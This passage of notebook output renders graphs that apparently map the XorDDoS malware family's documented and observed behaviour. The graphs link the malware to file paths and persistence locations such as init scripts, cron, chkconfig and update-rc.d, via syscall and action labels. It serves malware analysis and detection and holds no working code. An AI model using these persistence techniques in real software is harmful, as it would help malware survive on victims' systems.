x=\"2293.4\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^chkconfig$</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge14\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1487.86,-91.99C1498.58,-89.99 1509.81,-88.18 1520.4,-87 1667.76,-70.56 2043.16,-103.36 2187.4,-69 2194.62,-67.28 2228.08,-51.26 2255.51,-37.81\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2257.1,-40.93 2264.53,-33.37 2254.01,-34.64 2257.1,-40.93\"/>\n<text text-anchor=\"middle\" x=\"2246.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">27.install</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge27\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1487.86,-91.96C1498.58,-89.96 1509.81,-88.16 1520.4,-87 1561.88,-82.44 2236.72,-92.22 2271.4,-69 2279.3,-63.71 2284.39,-54.89 2287.65,-46.12\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2291.04,-47.02 2290.62,-36.43 2284.34,-44.97 2291.04,-47.02\"/>\n<text text-anchor=\"middle\" x=\"2315.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">33.perform</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge34\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1487.85,-91.94C1498.58,-89.95 1509.81,-88.15 1520.4,-87 1543.35,-84.5 2335.25,-85.5 2351.4,-69 2362.3,-57.86 2351.04,-46.43 2335.64,-37.32\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2337.23,-34.2 2326.77,-32.51 2333.89,-40.35 2337.23,-34.2\"/>\n<text text-anchor=\"middle\" x=\"2375.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">25.add</text>\n</g>\n<!-- 12 -->\n<g id=\"node13\" class=\"node\">\n<title>12</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2607.4\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2607.4\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge17\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1487.85,-91.93C1498.58,-89.94 1509.81,-88.15 1520.4,-87 1714.64,-65.98 2207.11,-103.6 2399.4,-69 2419.32,-65.42 2422.91,-59.44 2442.4,-54 2481.63,-43.04 2526.95,-33.66 2560.15,-27.37\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2560.86,-30.8 2570.05,-25.52 2559.58,-23.92 2560.86,-30.8\"/>\n<text text-anchor=\"middle\" x=\"2479.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">8.resolv.conf</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge22\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1487.85,-91.91C1498.58,-89.92 1509.81,-88.13 1520.4,-87 1630.46,-75.22 2410.59,-101.5 2516.4,-69 2528.07,-65.42 2528.85,-60.13 2539.4,-54 2549.79,-47.96 2561.33,-41.82 2571.91,-36.4\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2573.56,-39.48 2580.91,-31.84 2570.4,-33.24 2573.56,-39.48\"/>\n<text text-anchor=\"middle\" x=\"2562.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">40.fetch</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge28\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1487.85,-91.9C1498.58,-89.91 1509.81,-88.13 1520.4,-87 1549.82,-83.87 2560.76,-85.38 2585.4,-69 2593.43,-63.66 2598.56,-54.67 2601.81,-45.77\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2605.23,-46.55 2604.75,-35.97 2598.53,-44.54 2605.23,-46.55\"/>\n<text text-anchor=\"middle\" x=\"2619.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">43.read</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge31\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1487.85,-91.9C1498.57,-89.9 1509.81,-88.12 1520.4,-87 1551.45,-83.71 2622.5,-91.26 2644.4,-69 2652.97,-60.29 2646.74,-49.51 2637.11,-40.19\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2639.13,-37.31 2629.28,-33.41 2634.55,-42.6 2639.13,-37.31\"/>\n<text text-anchor=\"middle\" x=\"2677.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.m6_6n3</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge33\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1487.85,-91.89C1498.57,-89.9 1509.8,-88.12 1520.4,-87 1553.25,-83.53 2686.22,-92.53 2709.4,-69 2730.27,-47.81 2691.15,-34.23 2655.48,-26.65\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2656.05,-23.2 2645.56,-24.67 2654.68,-30.06 2656.05,-23.2\"/>\n<text text-anchor=\"middle\" x=\"2740.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">30.create</text>\n</g>\n<!-- 13 -->\n<g id=\"node14\" class=\"node\">\n<title>13</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2866.4\" cy=\"-18\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2866.4\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">GID($|.|$)</text>\n</g>\n<!-- Start&#45;&gt;13 -->\n<g id=\"edge20\" class=\"edge\">\n<title>Start&#45;&gt;13</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1487.85,-91.88C1498.57,-89.89 1509.8,-88.11 1520.4,-87 1658.54,-72.47 2635.72,-103 2770.4,-69 2793.67,-63.12 2817.62,-50.66 2835.78,-39.65\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2838.09,-42.34 2844.71,-34.07 2834.38,-36.4 2838.09,-42.34\"/>\n<text text-anchor=\"middle\" x=\"2839.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">45.execute</text>\n</g>\n<!-- Start&#45;&gt;13 -->\n<g id=\"edge37\" class=\"edge\">\n<title>Start&#45;&gt;13</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1487.85,-91.87C1498.57,-89.88 1509.8,-88.11 1520.4,-87 1557.78,-83.09 2847,-95.75 2873.4,-69 2879.42,-62.9 2879.82,-54.17 2878.02,-45.71\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2881.34,-44.62 2875.09,-36.07 2874.65,-46.65 2881.34,-44.62\"/>\n<text text-anchor=\"middle\" x=\"2904.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">10.assign</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1579.4\" cy=\"-105\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1579.4\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">mem_addr</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1681.4\" cy=\"-105\" rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1681.4\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n<!-- 14 -->\n<g id=\"node15\" class=\"node\">\n<title>14</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1785.4\" cy=\"-105\" rx=\"52.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1785.4\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">update&#45;rc.d</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x169caaa6cb0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Ms.csv matched doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"866pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 866.39 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 862.39,-127 862.39,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"421.49\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"421.49\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"71.49\" cy=\"-18\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"71.49\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M344.09,-103.46C262.14,-101.52 139.37,-94.3 100.49,-69 91.97,-63.45 85.65,-54.46 81.12,-45.62\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"84.2,-43.94 76.9,-36.26 77.82,-46.82 84.2,-43.94\"/>\n<text text-anchor=\"middle\" x=\"123.49\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">38.fetch</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"188.49\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"188.49\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M343.82,-104.78C273.7,-103.62 177.87,-96.77 153.49,-69 145.06,-59.39 152.36,-47.73 162.43,-38.08\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"164.79,-40.66 170.07,-31.47 160.21,-35.37 164.79,-40.66\"/>\n<text text-anchor=\"middle\" x=\"175.99\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">50.drop</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M350.36,-97.65C318.07,-92.77 280.13,-84.17 248.49,-69 234.13,-62.11 220.31,-51.01 209.57,-41.02\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"211.94,-38.45 202.32,-34.02 207.08,-43.49 211.94,-38.45\"/>\n<text text-anchor=\"middle\" x=\"271.49\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">41.fetch</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"289.49\" cy=\"-18\" rx=\"55.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"289.49\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^chkconfig$</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M356.57,-95.07C338.87,-89.91 320.9,-81.79 307.49,-69 301.13,-62.94 297.01,-54.46 294.35,-46.21\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"297.7,-45.21 291.76,-36.43 290.94,-46.99 297.7,-45.21\"/>\n<text text-anchor=\"middle\" x=\"331.99\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">27.install</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"395.49\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"395.49\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M383.47,-89.23C375.12,-84.13 367.33,-77.49 362.49,-69 357,-59.35 361.82,-49.06 369.32,-40.33\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"371.89,-42.71 376.4,-33.13 366.89,-37.81 371.89,-42.71\"/>\n<text text-anchor=\"middle\" x=\"380.99\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">35.use</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"491.49\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"491.49\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M417.68,-87C416.32,-76.7 416.4,-63.71 422.49,-54 428.45,-44.51 437.86,-37.48 447.83,-32.33\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"449.43,-35.45 457.07,-28.1 446.52,-29.08 449.43,-35.45\"/>\n<text text-anchor=\"middle\" x=\"447.99\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">30.create</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M451.68,-88.32C459.62,-83.05 467.61,-76.55 473.49,-69 478.76,-62.25 482.57,-53.82 485.29,-45.82\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"488.7,-46.65 488.18,-36.07 481.98,-44.66 488.7,-46.65\"/>\n<text text-anchor=\"middle\" x=\"505.49\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">40.fetch</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"598.49\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"598.49\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M473.51,-91.59C492.63,-86.01 514.09,-78.51 532.49,-69 547.85,-61.07 563.34,-49.55 575.46,-39.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"577.88,-42.1 583.26,-32.97 573.36,-36.76 577.88,-42.1\"/>\n<text text-anchor=\"middle\" x=\"581.99\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">29.create</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M495.69,-99.91C542.43,-95.6 596.66,-86.82 611.49,-69 617.25,-62.09 616.5,-52.92 613.46,-44.33\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"616.57,-42.7 609.28,-35.01 610.18,-45.57 616.57,-42.7\"/>\n<text text-anchor=\"middle\" x=\"639.49\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">39.fetch</text>\n</g>\n<!-- 7 -->\n<g id=\"node8\" class=\"node\">\n<title>7</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"707.49\" cy=\"-18\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"707.49\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge10\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M495.25,-99.35C556.47,-94.42 637.95,-85.08 666.49,-69 676.98,-63.1 685.87,-53.37 692.67,-44.06\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"695.59,-45.99 698.3,-35.74 689.79,-42.06 695.59,-45.99\"/>\n<text text-anchor=\"middle\" x=\"706.99\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">20.drop</text>\n</g>\n<!-- 8 -->\n<g id=\"node9\" class=\"node\">\n<title>8</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"815.49\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"815.49\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge11\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M498.85,-104.55C563.25,-102.86 656.52,-95.33 733.49,-69 752.88,-62.37 772.55,-50.58 787.76,-40.12\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"790.03,-42.8 796.17,-34.16 785.99,-37.09 790.03,-42.8\"/>\n<text text-anchor=\"middle\" x=\"785.99\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.drop</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x169caaa6e60>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "matched ASG OPset for doc Xorddos-Ms.csv\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"1436pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 1435.94 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 1431.94,-127 1431.94,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"620.69\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"620.69\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"173.69\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"173.69\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M544.08,-102.39C383.89,-98.64 26.8,-88.17 8.69,-69 -29.79,-28.25 76.31,-20.36 136.06,-19.06\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"136.34,-22.56 146.29,-18.9 136.23,-15.56 136.34,-22.56\"/>\n<text text-anchor=\"middle\" x=\"45.69\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">70.newfstatat</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M543.33,-104.42C406.85,-104.36 134.89,-100.25 105.69,-69 90.92,-53.19 115.81,-38.98 139.53,-29.79\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"140.95,-33 149.15,-26.29 138.56,-26.42 140.95,-33\"/>\n<text text-anchor=\"middle\" x=\"128.69\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">56.lseek</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M543.47,-103.46C422.48,-101.81 199.41,-95.2 174.69,-69 169,-62.96 167.42,-54.46 167.67,-46.17\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"171.18,-46.32 168.8,-36 164.22,-45.55 171.18,-46.32\"/>\n<text text-anchor=\"middle\" x=\"193.19\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">33.stat</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge10\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M543.93,-102.35C447.72,-99.38 288.87,-91.18 234.69,-69 226.22,-65.53 209.95,-52.04 196.34,-39.94\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"198.49,-37.17 188.72,-33.07 193.8,-42.37 198.49,-37.17\"/>\n<text text-anchor=\"middle\" x=\"260.19\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.stat64</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge13\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M545.58,-100.52C484.94,-96.44 397.83,-87.66 323.69,-69 306.09,-64.57 302.81,-60.05 285.69,-54 259.87,-44.88 230.29,-35.69 208.01,-29.02\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"208.92,-25.63 198.33,-26.14 206.92,-32.34 208.92,-25.63\"/>\n<text text-anchor=\"middle\" x=\"346.69\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">51.open</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"445.69\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"445.69\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M543.47,-103.49C480.59,-101.23 398.9,-93.48 377.69,-69 363.53,-52.65 388.32,-38.52 411.85,-29.5\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"413.17,-32.74 421.4,-26.07 410.8,-26.16 413.17,-32.74\"/>\n<text text-anchor=\"middle\" x=\"400.69\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">58.lseek</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M548.36,-98.47C506.63,-93.62 459.88,-84.78 446.69,-69 441.45,-62.72 439.93,-54.29 440.1,-46.15\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"443.59,-46.45 441.07,-36.16 436.62,-45.77 443.59,-46.45\"/>\n<text text-anchor=\"middle\" x=\"468.69\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">3.stat64</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge12\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M579.78,-89.68C564.18,-83.81 546.38,-76.6 530.69,-69 510.8,-59.36 489.36,-46.73 472.99,-36.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"474.78,-33.57 464.45,-31.22 471.06,-39.5 474.78,-33.57\"/>\n<text text-anchor=\"middle\" x=\"553.69\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">53.open</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"659.69\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"659.69\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M596.03,-87.8C584.64,-78.23 575.14,-65.73 582.69,-54 591.03,-41.06 605.44,-32.85 619.56,-27.66\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"620.78,-30.95 629.22,-24.54 618.62,-24.29 620.78,-30.95\"/>\n<text text-anchor=\"middle\" x=\"610.19\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.readlink</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M629.12,-86.97C631.9,-81.28 634.97,-74.89 637.69,-69 641.28,-61.25 645.06,-52.77 648.46,-45.03\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"651.72,-46.3 652.52,-35.74 645.31,-43.5 651.72,-46.3\"/>\n<text text-anchor=\"middle\" x=\"672.19\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">68.access</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge17\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M674.63,-91.9C686.08,-86.75 696.78,-79.42 703.69,-69 711.28,-57.57 702.38,-46 690.66,-36.87\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"692.45,-33.85 682.25,-30.97 688.43,-39.58 692.45,-33.85\"/>\n<text text-anchor=\"middle\" x=\"743.69\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">69.newfstatat</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"882.69\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"882.69\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M683.67,-94.54C714.63,-88.89 752.18,-80.54 784.69,-69 807.74,-60.82 832.25,-48.31 850.99,-37.86\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"852.73,-40.89 859.7,-32.91 849.28,-34.81 852.73,-40.89\"/>\n<text text-anchor=\"middle\" x=\"841.69\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">57.lseek</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge14\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M697.29,-102.17C760.51,-99.08 843.74,-90.84 868.69,-69 875.25,-63.26 878.85,-54.72 880.8,-46.32\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"884.27,-46.77 882.43,-36.34 877.36,-45.64 884.27,-46.77\"/>\n<text text-anchor=\"middle\" x=\"904.19\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">50.stat64</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge16\" 